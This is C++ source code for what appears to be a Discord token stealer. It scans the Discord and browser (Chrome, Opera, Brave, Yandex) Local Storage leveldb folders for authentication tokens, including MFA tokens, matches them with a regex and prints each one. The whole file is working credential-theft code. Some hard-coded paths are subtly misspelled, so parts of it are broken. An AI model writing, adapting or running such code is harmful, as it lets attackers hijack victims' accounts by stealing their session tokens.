#include<cstdio>
#include<iostream>
#include<filesystem>
#include<fstream>
#include<regex>
#include<string>
#include<unordered_set>
#include<utility>
#include<map>

std::unordered_set<std::string> GetTokens(std::filesystem::directory_entry dir)
{
    std::unordered_set<std::string> tokens;

    std::string file_path{ dir.path().u8string() };
    std::string extension{ dir.path().extension().u8string() };

    if (extension == ".ldb" || extension == ".log") {
        std::ifstream fin{ file_path, std::ios::binary | std::ios::in };
        std::string   text{ std::istreambuf_iterator<char>{ fin }, std::istreambuf_iterator<char>{} };

        std::regex r{ R"([\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84})" };

        std::sregex_iterator start_match{ text.begin(), text.end(), r };
        std::sregex_iterator end_match;

        while (start_match != end_match)
        {
            std::smatch match{ *start_match };
            tokens.insert(match.str());
            start_match++;
        }
    }

    return tokens;
}

int main()
{
    std::unordered_set<std::string> tokens;

    std::string local   { getenv("localappdata") }; // appdata->local
    std::string roaming { getenv("appdata") };      // appdata->roaming

    std::map<std::string, std::string> leveldb;
    leveldb.insert(std::make_pair("discord"      , roaming + "\\discord\\Local Storage\\leveldb"));
    leveldb.insert(std::make_pair("discordptb"   , roaming + "\\discordptb\\Local Storage\\leveldb"));
    leveldb.insert(std::make_pair("discordcanary", roaming + "\\discordcanary\\Local Storage\\leveldb"));
    leveldb.insert(std::make_pair("chrome"       , local   + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb"));
    leveldb.insert(std::make_pair("opera"        , roaming + "\\Opera Software\\Ofera Stable\\Local Storage\\leveldb"));
    leveldb.insert(std::make_pair("brave"        , local   + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb"));
    leveldb.insert(std::make_pair("yandex"       , local   + "\\Yandex\\YandexBrowser\\User Data\\Defaul\\Local Storage\\leveldbt"));

    std::cout << " ================================Client================================" << std::endl;

    for (const auto& path : leveldb)
    {
        if (!std::filesystem::exists(path.second)) {
            std::cout << " >  " << path.first << ":  Doesn't Exist" << std::endl << std::endl;
            continue;
        }

        std::cout << " >  " << path.first << ":  Exists <-" << std::endl;

        for (const auto& dir : std::filesystem::directory_iterator{ path.second })
        {
            for (const auto& tkn : GetTokens(dir)) {
                std::cout << "    >>  " << tkn << std::endl;
            }
        }
        std::cout << std::endl;
    }

    return 0;
}